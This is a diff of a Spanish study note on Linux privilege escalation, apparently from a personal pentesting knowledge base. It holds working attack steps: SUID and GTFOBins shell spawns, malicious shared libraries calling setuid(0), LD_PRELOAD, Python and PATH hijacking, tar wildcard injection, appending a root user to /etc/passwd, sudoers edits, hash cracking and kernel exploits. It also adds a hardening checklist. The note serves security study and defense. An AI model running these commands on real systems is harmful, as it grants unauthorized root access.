@@ -1,5 +1,4 @@
-# 🐧 Escalada de Privilegios en Linux
-
+> [!WARNING]
 > La escalada de privilegios local (LPE) consiste en pasar de un usuario con bajos permisos a **root**. En Linux, casi nunca requiere exploits sofisticados: la mayoría de las veces es una mala configuración en sudo, un binario SUID innecesario, un cron job con permisos débiles o credenciales en texto claro en un archivo de configuración. La clave es la **enumeración sistemática**.
 
 ---
@@ -7,74 +6,87 @@
 
 Para atacar un sistema Linux debemos hacernos estas preguntas:
 
-**¿Quienes somos? ¿Pertenecemos a algun grupo importante?** Por ejemplo: `adm`, `lxd`, `docker`, `shadow`,
+1️⃣**¿Quienes somos? ¿Pertenecemos a algun grupo importante?** Por ejemplo: `adm`, `lxd`, `docker`, `shadow`,
 
-**¿Cuál es la versión del kernel?** A lo mejor es vulnerable.
+2️⃣**¿Cuál es la versión del kernel?** A lo mejor es vulnerable.
 
-**¿Qué podemos ejecutar como sudo?**
+3️⃣**¿Qué podemos ejecutar como sudo?**
 - Puede que tenga una explotación en gtfobins
 - Puede que permita ejecutar comandos o leer archivos de root con alguna opción rara
 - ¿Hay alguna opción para editar variables como `LD_PRELOAD`o `SETENV`?
 - Si es un python, puede que sea escribible o que por ejemplo cargue una librería mal protegida
 
-**¿Se ejecuta alguna capability especial?**
+4️⃣**¿Se ejecuta alguna capability especial?**
 - Si es un lenguaje de programación puede que tenga exploit en gtfobins
 - Si no, puede que tenga alguna que le permita acceder a algun archivo privilegiado o algo
 
-**¿Hay algun comando SUID?**
+5️⃣**¿Hay algun comando SUID?**
 - Si es un script puede que tenga malos permisos o ejecute otro script con malos permisos
 - Puede que ejecute un binario con una ruta relativa > Path hijacking
 - Puede que cargue una librería en un path vulnerable o que se pueda cambiar el path
 - Si es un python, puede que cargue alguna librería mal protegida
 - Puede que permita ejecutar comandos o leer archivos de root con alguna opción rara
 
-**¿Hay alguna tarea cron que se ejecute como un usuario privilegiado?**
+6️⃣**¿Hay alguna tarea cron que se ejecute como un usuario privilegiado?**
 - Si es un script puede que tenga malos permisos o ejecute otro script con malos permisos
 - Puede que ejecute un comando con un `*`, de lo que uno se podrá aprovechar
 - Puede que sea un software con algun exploit como `rotate`
 
-**¿Qué software hay instalado?** Por ejemplo la versión 4.05.00 de Screen permite una escalada
+7️⃣**¿Qué software hay instalado?** Por ejemplo la versión 4.05.00 de Screen permite una escalada
 
-**¿Tiene el sistema NICs adicionales en otras subredes?** Podemos usar `route`, `netstat -rn` o `arp` para numerar
+8️**¿Tiene el sistema NICs adicionales en otras subredes?** Podemos usar `route`, `netstat -rn` o `arp` para numerar
 - Esto permite posible movimiento lateral
 - A lo mejor hay una aplicación vulnerable corriendo en el localhost
 
-**¿Y en cuanto a archivos?**
+9️⃣**¿Y en cuanto a archivos?**
 - ¿Hay algo raro en el historial o en la bash de nuestro usuario?
 - ¿Podemos acceder a alguna clave SSH mal protegida o contraseña harcodeada en algun archivo? Mirar sobre todo archivos de configuración
+- ¿Hay algun archivo backup interesante? No hay que descuidarlos
 
+--------
 
 # 1. 🔑 Binarios SUID
 
-## 1.1. 🔒 Abuso de SUID/SGID
-
+> [!CAUTION]
 Los binarios con SUID se ejecutan con los privilegios del propietario (normalmente root), independientemente de quién los invoque.
+
+-------
+## 1.1. 🔒 Abuso de SUID/SGID - Gtfobins
 
 > 🔎 **Enumeración**: Para encontrar binarios SUID hay que utilizar este filtro: `find / -perm -4000 -type f 2>/dev/null`
 
-> 💥 **Ataque**: Luego buscamos el vector SUID en [GTFObins]([GTFOBins](https://gtfobins.org/#//^suid$)). Por ejemplo find con SUID se explotaría así:
->  `find . -exec /bin/bash -p \; -quit`
+Luego buscamos el vector SUID en [GTFObins]([GTFOBins](https://gtfobins.org/#//^suid$)). 
 
----
-## 1.2. SUID en binario que carga shared libraries
+Por ejemplo find con SUID se explotaría así:
+```
+find . -exec /bin/bash -p \; -quit
+```
 
-Primero vemos que librerías carga un binario SUID  `strace /usr/local/bin/suid_app 2>&1 | grep "open.*\.so.*ENOENT"`
+ ---
+## 1.2. 📚 SUID en binario que carga shared libraries
 
-#### 💥 Ataque
-Si busca una .so que existe en una ruta escribible podemos plantar la .so maliciosa. Vemos las librerías que necesita con `ldd /usr/local/bin/suid_app`
+> 🔎 **Enumeración**: Primero vemos que librerías carga un binario SUID
+```bash
+strace /usr/local/bin/suid_app 2>&1 | grep "open.*\.so.*ENOENT"
+ldd /usr/local/bin/suid_app
+# libshared.so => /development/libshared.so (0x00007f0c13112000)
+# /lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)
+```
 
-Y creamos una .so maliciosa en la ruta donde la busca
+Si busca una .so que existe en una ruta escribible podemos plantar la .so maliciosa en la ruta dónde la busca
 ```bash
 cat > /tmp/evil.c << 'EOF'
 #include <stdio.h>
 #include <stdlib.h>
 static void inject() __attribute__((constructor)); void inject() { setuid(0); system("/bin/bash -p"); }
 EOF
-gcc -shared -fPIC -o /ruta/donde/busca/evil.so /tmp/evil.c && /usr/local/bin/suid_app
+gcc -shared -fPIC -o /development/libshared.so /tmp/evil.c 
+/usr/local/bin/suid_app
 ```
 
 ---
 ## 1.3. Dumpeo de memorias
+
 Tenemos un binario que lee un archivo para decir su cantidad de lineas, mientras que esta corriendo, lee el archivo, por tanto este estara en su memoria hasta que finalice el proceso. Si lo hacemos crasehar, podremos ver esa memoria antes de ser eliminada.
 ```shell
 ./count
@@ -87,7 +99,10 @@ apport-unpack /var/crash/count.1000.crash /tmp/crash-report
 strings /tmp/crash-report/CoreDump # -> Todo el archivo :)
 ```
 
+----
+
 ## 1.4. Shared Object Hijacking
+
 Tenemos un suid raro y vemos sus librerías con `ldd`, encontramos que carga la librería `glibc` (como es normal) y otra que una que no es de las estandares. La examinamos con `readelf`
 ```bash
 ldd payroll
@@ -97,6 +112,7 @@ ldd payroll
 readelf -d payroll  | grep PATH
 # 0x000000000000001d (RUNPATH)    Library runpath: [/development]
 ```
+
 Utiliza `RUNPATH` para cargarse desde una ubicacion personalizada ¿El problema? Que la carpeta `/development` tiene permisos de escritura para el resto de usuarios. Así que un atacante puede colocar ahí una librería maliciosa, y como se verifican primero las librerías en esa ubicación, se procede al secuestro.
 
 Antes de compilar una biblioteca, necesitamos encontrar el nombre de la función que es llamada por el binario. Para ello hacemos una copia de libc en ese directorio con el nombe de la librería rara y vemos que se queja porque no encuentra la función `dbquery`
@@ -124,8 +140,6 @@ gcc /tmp/evil.c -fPIC -shared -o /development/libshared.so
 
 Las capabilities son más sigilosas que SUID porque no aparecen en un `ls -la`. Hay que buscarlas explícitamente.
 
-Las capabilities peligrosas serían estas. La mayoría de explotaciones las encontramos en [GTFObins]([GTFOBins](https://gtfobins.org/#//^capabilities$))
-
 | Capability peligrosa                | Binario             | Explotación                                                    |
 | ----------------------------------- | ------------------- | -------------------------------------------------------------- |
 | `cap_setuid+ep`<br>`cap_setguid+ep` | python3, perl, ruby | `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
@@ -136,13 +150,21 @@ Las capabilities peligrosas serían estas. La mayoría de explotaciones las enco
 
 Las capabilities se asignan con el valor `+ep`, que hace que sean efectivas o `+ei` para que los procesos hijo las hereden
 
+--------
+## 2.1. 🔒 Abuso de capabilities - Gtfobins
+
+La mayoría de explotaciones las encontramos en [GTFObins]([GTFOBins](https://gtfobins.org/#//^capabilities$))
+
 Ejemplo con  **cap_dac_read_search**:
 ```bash
 tar -cvf shadow.tar /etc/shadow 2>/dev/null && tar -xvf shadow.tar && cat etc/shadow # tar
 vim /etc/shadow # vim
 ```
 
-Si no esta en gtfobins, se busca manualmente:
+## 2.2. 🔒 Abuso de capabilities - Otros
+
+**Si no esta en gtfobins, se busca manualmente:**
+
 ```bash
 getcap /usr/bin/vim.basic
 # /usr/bin/vim.basic cap_dac_override=eip
@@ -153,6 +175,7 @@ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
 # 3. 🔒 Abuso de sudo
 
 `sudo -l` es **siempre el primer comando** a ejecutar. Muestra qué puede hacer el usuario actual como root.
+
 ```bash
 sudo -l
 # Ejemplo de salida peligrosa:
@@ -160,21 +183,24 @@ sudo -l
 # (ALL) /usr/bin/python3
 ```
 
-> Todas las herramientas que permitan spawnear una shell son propensas a escalada, pro ejemplo ncdu permite hacerlo presionando la tecla `b`. Para ello es util ver la guía `--help`
+--------
+## 3.1. Abuso de parámetros
 
-## 3.1. Gtfobins
-Si se puede ejecutar un intérprete, editor o comando con sudo que permita ejecución de código, hay acceso root. Referencia completa en [GTFOBins](https://gtfobins.github.io/). Por ejemplo vim se explotaría así: `sudo vim -c ':!/bin/bash'`
- 
-A parte de gtfobins, tenemos que buscar manualmente si podemos aprovecharnos, 
-> Por ejemplo `(root) NOPASSWD: /usr/sbin/tcpdump` es vulnerable por el parámetro `-z` de `tcpdump`.
+> [!WARNING]
+> Todas las herramientas que permitan spawnear una shell o leer un archivo comprometido son propensas a escalada
 
+La mayoría los encontraremos en [GTFOBins](https://gtfobins.github.io/). Por ejemplo `vim` se explotaría así: `sudo vim -c ':!/bin/bash'` 
+
+Otros, hay que leer las opciones con `--help`, por ejemplo `ncdu` permite hacerlo presionando la tecla `b`. 
+
+-------
 ## 3.2. sudo con Ld preload
 
+> [!WARNING]
 Cuando un programa se compila, puede usar varios métodos para buscar las librerías dinámicas.  **La variable `LD_PRELOAD` es muy importate ya que permite especificar de dónde cargar la librería antes de ejecutar el binario,** 
 
 ¿Y si creamos una librería maliciosa y le decimos al sistema que la cargue? 
 
-#### 🔎 Enumeración
 Si `sudo -l` muestra `env_keep+=LD_PRELOAD`, se puede precargar una librería maliciosa antes de ejecutar cualquier comando sudo. Por ejemplo, permite ejecutar openssl como root, que no es un binario que tenga via de escalada por gtfobins
 ```bash
 cat sudoers
@@ -182,7 +208,6 @@ cat sudoers
 # antonio ALL=(root) SETENV: /usr/bin/openssl
 ```
 
-#### 💥 Ataque
 Creamos la lubrería maliciosa y la cargamos
 ```bash
 cat > /tmp/evil.c << 'EOF'
@@ -196,11 +221,17 @@ gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles
 sudo LD_PRELOAD=/tmp/evil.so /usr/bin/openssl
 ```
 
+-------
+
 ## 3.3 Python library hijacking
 
+> [!WARNING]
 Python, contiene muchas librerías para poder trabajar, como `requests`. Una de ellas, la más importante es la **Biblioteca Estándar,** con muchos módulos incluidos desde una instalación estándar de Python
+> 
+Si el código python se ejecuta como root a través de sudo o por una tarea cron, podemos considerar atacarlo de manera indirecta, ya que no tiene permisos de escritura. 
 
-Si el código python se ejecuta como root a través de sudo o por una tarea cron, podemos considerar atacarlo de manera indirecta, ya que no tiene permisos de escritura. Por razones de seguridad, Linux ignora por defecto el bit SUID en los scripts interpretados. Para que el bit SUID realmente nos conceda privilegios elevados aquí, necesitaría estar configurado directamente en el propio ejecutable de Python `/usr/bin/python3)`
+Por razones de seguridad, Linux ignora por defecto el bit SUID en los scripts interpretados. Para que el bit SUID realmente nos conceda privilegios elevados aquí, necesitaría estar configurado directamente en el propio ejecutable de Python `/usr/bin/python3)`
+
 ```bash
 sudo -l
 #  (ALL) NOPASSWD: /usr/bin/python3 /home/paco/mem_status.py
@@ -217,7 +248,9 @@ cat /home/paco/programa.py
 
 También podemos ver en la segunda línea que importa el módulo `psutil` y utiliza la función `virtual_memory()`.
 
-#### Permisos de escritura inseguros en el módulo de python
+### 3.3.1. Permisos de escritura inseguros en el módulo de python
+
+> [!CAUTION]
 Esto permite que pueda ser manipulado para insertar código malicioso. Este tipo de permisos son más comunes en entornos de desarrollo donde muchos desarrolladores trabajan en diferentes scripts y pueden requerir privilegios más altos.
 
 Así que podemos buscar esta función en la carpeta de psutil y comprobar si este módulo tiene permisos de escritura para nosotros.
@@ -234,8 +267,12 @@ sudo /usr/bin/python3 /home/htb-student/mem_status.py
 bash-5.0#
 ```
 
-#### Ruta de búsqueda de bibliotecas de Pythonn
-En Python, cada versión tiene un orden específico en el que se buscan e importan las bibliotecas (módulos). Esto se basa en el PATH propio de python o `PYTHONPATH`. Lo podemos imprimir con `python3 -c 'import sys; print("\n".join(sys.path))'` y saldrá una lista de rutas dónde las más altas tienen prioridad sobre las que están más abajo
+### 3.3.2. Ruta de búsqueda de bibliotecas de Pythonn
+
+> [!CAUTION]
+En Python, cada versión tiene un orden específico en el que se buscan e importan las bibliotecas (módulos). Esto se basa en el PATH propio de python o `PYTHONPATH`. 
+> 
+> Lo podemos imprimir con `python3 -c 'import sys; print("\n".join(sys.path))'` y saldrá una lista de rutas dónde las más altas tienen prioridad sobre las que están más abajo
 
 Para poder utilizar esta variante, es necesario que podamos editar una de las rutas con mayor prioridad que la del módulo cargado. En este caso, crearemos un módulo malicioso que se llame igual.
 ```bash
@@ -250,10 +287,13 @@ def virtual_memory():
     import os; os.system('id')
 ```
 
-#### Variable de entorno PYTHONPATH
-PYTHONPATH es una variable de entorno que indica en qué directorio (o directorios) puede buscar Python los módulos. 
+### 3.3.3. Variable de entorno PYTHONPATH
 
-Si un usuario puede manipular esta variable mientras ejecuta el binario de python, podrá apuntar a la ubicación que quiera. Podemos ver si podemos editar variables de entorno para el binario de python  con el `sudo`
+> [!CAUTION]
+PYTHONPATH es una variable de entorno que indica en qué directorio (o directorios) puede buscar Python los módulos. Si un usuario puede manipular esta variable mientras ejecuta el binario de python, podrá apuntar a la ubicación que quiera. 
+
+
+Podemos ver si podemos editar variables de entorno para el binario de python  con el `sudo`
 ```bash
 sudo -l 
 # (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
@@ -270,7 +310,6 @@ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
 
 Los cron jobs suelen ejecutarse como root. Si el script que ejecutan es modificable o está en una ruta controlable, se obtiene ejecución como root. 
 
-#### 🔎 Monitoreo
 Podemos encontrar scrips de cron en la ruta `/etc/cron.d/*` o en `/etc/crontab`.
 Tambien podemos monitorear procesos  en tiempo real con la herramienta `./pspy64` O crear un script como `procmon.sh`
 ```bash
@@ -282,21 +321,27 @@ while true; do
 done
 ```
 
+
 ## 4.1. Path hijacking
 
+> [!CAUTION]
 Si se invoca un comando por su ruta relativa  (`ls` no `/bin/ls`) el sistema lo buscará dentro de las rutas listadas en el PATH. Ejecutará por tanto el primero que encuentre.
-- Por ejemplo vemos en sudoers o en tareas cron este script `/usr/local/bin/system_status.sh`  y ejecuta `free -m`
-- O dentro de un SUID encontramos con strings que ejecuta otro comando `strings /usr/local/bin/binario | grep -v "^/"` y ejecuta `free -m`
 
-#### 💥 Ataque
- 1. Por tanto tenemos que crear en temp o el directorio actual un script de bash que se llame igual: 
- 2. Luego actualizamos el path. Por tanto este empezará por la ruta que hemos indicado y encontrarña antes NUESTRO binario
- 3. Ejecutamos o esperamos a que se ejecute y tendremos una bash SUID
+Por ejemplo vemos en sudoers o en tareas cron este script `/usr/local/bin/system_status.sh`  y ejecuta `free -m`
+
+O dentro de un SUID encontramos con strings que ejecuta otro comando `strings /usr/local/bin/binario | grep -v "^/"` y ejecuta `free -m`
+
 ```bash
+# 1. Tenemos que crear en temp o el directorio actual un script de bash que se llame igual: 
 echo -e '#!/bin/bash\nchmod +s /bin/bash' > /tmp/free && chmod +x !$
+
+# 2. Luego actualizamos el path para que priorice nuestra locaclización
 export PATH=.:${PATH}
+
+# 3. Ejecutamos o esperamos a que se ejecute y tendremos una bash SUID
 ```
 
+---------
 ## 4.2. Permisos incorrectos
 
 Encontramos este crontab de root `* * * * * /opt/scripts/backup.sh`
@@ -304,6 +349,7 @@ Encontramos este crontab de root `* * * * * /opt/scripts/backup.sh`
 2. O que ejecute un binario SUID al que podamos hacer un **path hijacking**
 
 ## 4.3. Wildcard abuse
+
 Tenemos un cronjob que ejecuta esto. Lo que nos llama la atención es el wildcard (`*`) y que se ejecuta en un directorio donde tenemos permisos de escritura
 ```bash
 */01 * * * * cd /home/kali && tar -zcf /home/kali/backup.tar.gz *
@@ -317,13 +363,13 @@ touch /home/kali/--checkpoint=1 && touch /home/kali/--checkpoint-action=exec=sh\
 
 En nuestro home se habran creado `backup.tar.gz` y `--checkpoint=1` y `--checkpoint-action=exec=sh`, dos archivos que se interpretan como parametros por culpa del `*`
 
-## 4.5. Logrotate
+------
+## 4.4. Logrotate
 
 En todos los sistemas Linux, se crean logs kilométricos. Para evitar que saturen el disco, la herramienta `logrotate` elimina los  mas viejos. Esta herramienta toma como factores el tamaño del log, su antiguedad y que hacer cuando estos dos lleguen a cierto tope. Para operar, lo que hace es renombrar los logs viejos, los borra y crea unos nuevos. Esta herramienta funciona por `cron` y se configura con `/etc/logrotate.conf`
 
-Para explotar esto necesitamos permisos de escritura en los logs, que la herramienta corra como root y que sea de la versión 3.8.6 a la 2.18.0
+> Para explotar esto necesitamos permisos de escritura en los logs, que la herramienta corra como root y que sea de la versión 3.8.6 a la 2.18.0
 
-#### 💥 Ataque
 Existe este exploit  [logrotten](https://github.com/whotwagner/logrotten). que podemos compilar y subir al sistema. Luego, escribir un payload y detetminar la opción que usa logrotate para adaptar el exploit
 ```bash
 git clone https://github.com/whotwagner/logrotten.git cd !$ 
@@ -337,6 +383,8 @@ echo "trigger rotation" >> ~/backups/access.log
 watch -n 1 ls -lah /etc/bash_completion.d # vemos hasta que salga hack -> su hack
 ```
 
+
+-----
 ## 4.6. 🧱 Timers de Systemd escribibles
 
 Los timers de systemd son el equivalente moderno a cron. Si un archivo `.service` o `.timer` es escribible.
@@ -397,7 +445,7 @@ debugfs: cat /etc/shadow
 ---
 # 6. 📂 Archivos y directorios con permisos débiles
 
-#### 💥passwd escribible
+## 6.1. passwd escribible
 Se puede añadir un usuario con UID 0 directamente (sin tocar `/etc/shadow`).
 ```bash
 # Generar hash de contraseña (openssl legacy pero funciona) → $1$hack$...
@@ -408,7 +456,7 @@ echo 'wtf:$1$wtf$TzyKlv0/R/c28R.GAeLw.1:0:0:root:/root:/bin/bash' >> /etc/passwd
 su wtf   # contraseña: pass → shell root
 ```
 
-#### 💥shadow legible
+## 6.2. 💥shadow legible
 Se pueden tratar de romper los hashes
 ```bash
 unshadow /etc/passwd /etc/shadow > hashes.txt # Crackear hashes con John o Hashcat
@@ -416,12 +464,14 @@ john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
 hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
-#### 💥sudoers escribible
+## 6.3. sudoers escribible
 Se pueden añadir usuarios con permiso de sudo
 ```bash
 echo 'jessica ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers && sudo bash
 ```
 
+> [!WARNING]
+Otro archivo es el de las claves públicas `authorized_keys`, para poder autenticarnos con kali sin proporcionar contrasela
 
 ---
 # 7. 💻 Exploits de kernel
@@ -458,6 +508,7 @@ export PATH="$PATH:/usr/lib/gcc/x86_64-linux-gnu/4.8" # actualizar el path
 
 ## 7.1. 💥PwnKit (CVE-2021-4034)
 
+> [!WARNING]
 > PwnKit (CVE-2021-4034) es una vulnerabilidad del binario "pkexec" que nos permite la escalada de privilegios a "root". Esta vulnerabilidad llevaba presente en el código de pkexec desde su creación, en 2009 y no se descubrió hasta enero de 2022. 
 
 Sabemos que cuando Linux ejecuta un programa, le entrega principalmente dos listas: los argumentos y las variables de entorno. Estos elementos, modifican el comportamiento del programa. En memoria, tras los argumentos `argv[]`  están las variables de entorno `envp[]`. pkexec asumía incorrectamente que siempre recibiría al menos un argumento que indicase el programa que debía ejecutar. 
@@ -465,6 +516,7 @@ Sabemos que cuando Linux ejecuta un programa, le entrega principalmente dos lis
 Sin embargo, si se indicaba que no había argumentos `argc = 0`, el programa trataba de ejecutar lo siguiente que estuviera en memoria ¿Qué era? Un variable de entorno, en concreto, `GCONV_PATH` que indica la codificación a utilizar para imprimir un error. Lo que haya en esa variable por tanto se entendía como el argumento 1, o sea el programa que pkexec debería ejecutar como root gracias al bit SUID
 
 ## 7.2. 💥DirtyCow
+
 Supongamos que nuestro proceso quiere acceder a un archivo que puede leer, pero no modificar, como **/etc/passwd**. El proceso es el siguiente:
 1. **Creación del mapeo privado:** La operación **mmap** busca una zona libre en la memoria virtual del proceso y la relaciona con las páginas donde está temporalmente el archivo en la RAM (memoria física).
 2. **Copy-on-write (COW):** Si el proceso quiere escribir en el archivo, el kernel debe crear una copia privada de la página y escribir sobre ella, no sobre el archivo orignal.
@@ -490,6 +542,8 @@ Una restricted shell es un tipo de shell que solo permite ciertas comandos o est
 - Funciones. `func() { echo ¨"hi" }`
 - Podemos tratar de ejecutar otras shells como `sh` 
 
+-----
+
 ## 7.2 💻 Multiplexadores
 
 Tmux permite dejar una sesión en segundo plano. Si root crea una sesión privilegiada con malos permisos, podremos 
@@ -513,13 +567,13 @@ tmux -S /shareds
 
 En lugar de lanzar los comandos manualmente uno a uno, estas herramientas automatizan toda la enumeración:
 
-|Herramienta|Uso|Destaca por|
-|---|---|---|
-|**LinPEAS**|`./linpeas.sh`|Enumeración exhaustiva, colorea por criticidad. La más completa|
-|**LinEnum**|`./LinEnum.sh`|Más antigua, más simple, menos ruido|
-|**linux-exploit-suggester**|`./les.sh`|Especializado en sugerir exploits de kernel por versión|
-|**pspy**|`./pspy64`|Monitoriza procesos en tiempo real sin ser root. Indispensable para cron|
-|**GTFOBins**|web|Referencia de binarios SUID/sudo explotables|
+| Herramienta                 | Uso            | Destaca por                                                              |
+| --------------------------- | -------------- | ------------------------------------------------------------------------ |
+| **LinPEAS**                 | `./linpeas.sh` | Enumeración exhaustiva, colorea por criticidad. La más completa          |
+| **LinEnum**                 | `./LinEnum.sh` | Más antigua, más simple, menos ruido                                     |
+| **linux-exploit-suggester** | `./les.sh`     | Especializado en sugerir exploits de kernel por versión                  |
+| **pspy**                    | `./pspy64`     | Monitoriza procesos en tiempo real sin ser root. Indispensable para cron |
+| **GTFOBins**                | web            | Referencia de binarios SUID/sudo explotables                             |
 
 ```bash
 # Subir herramientas al objetivo (desde atacante)
@@ -532,12 +586,54 @@ chmod +x linpeas.sh
 ./linpeas.sh 2>/dev/null | tee /tmp/linpeas_output.txt
 ```
 
----
+# 9 Hardening
 
+1. Actualizaciones y Parches
+☐ Mantener el sistema actualizado regularmente.  
+☐ Aplicar parches de seguridad lo antes posible.  
+☐ Automatizar las actualizaciones con `unattended-upgrades`.
+2. Gestión de la Configuración
+☐ Auditar archivos y directorios con permisos de escritura inseguros.  
+☐ Revisar binarios con el bit **SUID** activado.
+☐ Usar rutas absolutas en: reglas de sudo y cronjobs
+☐ No almacenar contraseñas o secretos en texto plano.  
+☐ Restringir el acceso a archivos sensibles.
+☐ Limpiar directorios `home` de archivos innecesarios.  
+☐ Eliminar o revisar el historial de Bash (`~/.bash_history`).
+☐ Verificar que usuarios sin privilegios no puedan modificar librerías utilizadas por programas privilegiados.
+☐ Desinstalar paquetes innecesarios.  
+☐ Deshabilitar servicios que no se utilicen.
+☐ Implementar **SELinux** (o AppArmor) para añadir controles de acceso obligatorios.
+3. Gestión de Usuarios
+☐ Reducir al mínimo las cuentas de usuario y administrador.
+☐ Registrar y monitorizar intentos de inicio de sesión (correctos e incorrectos).
+☐ Aplicar políticas de contraseñas robustas.  
+☐ Priorizar frases de contraseña largas frente a cambios frecuentes.  
+☐ Impedir la reutilización de contraseñas mediante: `/etc/security/opasswd` y PAM
+☐ Revisar los grupos a los que pertenece cada usuario.  
+☐ Aplicar el principio de **mínimo privilegio**.  
+☐ Limitar los permisos de `sudo`.
+☐ Automatizar auditorías con herramientas como: puppet, saltstack, zabbix, nagios
+☐ Verificar la integridad de binarios mediante checksums (ej. `vfs.file.cksum` en Zabbix).
+4. Auditoría
+☐ Realizar auditorías de seguridad y configuración.
+☐ Utilizar referencias como: DISA STIGs, ISO 27001, PCI-DSS o HIPAA
+☐ Complementar las auditorías con: Escaneos de vulnerabilidades, Pentests, Gestión de parches, -estión de configuración
+
+La herramienta es útil para informar sobre las rutas de escalada de privilegios y para realizar una comprobación rápida de la configuración, y realizará aún más comprobaciones si se ejecuta como usuario root.  
+```bash
+./lynis audit system
+```
+
+
+---
 ## 🔗 Ver también
 - [[Linux; gestión de identidades]]
 - [[Linux;  Procesos, redes y servicios]]
 - [[Docker]]
 - [[Windows; Escalada de privilegios]]
+
+
+
 
 
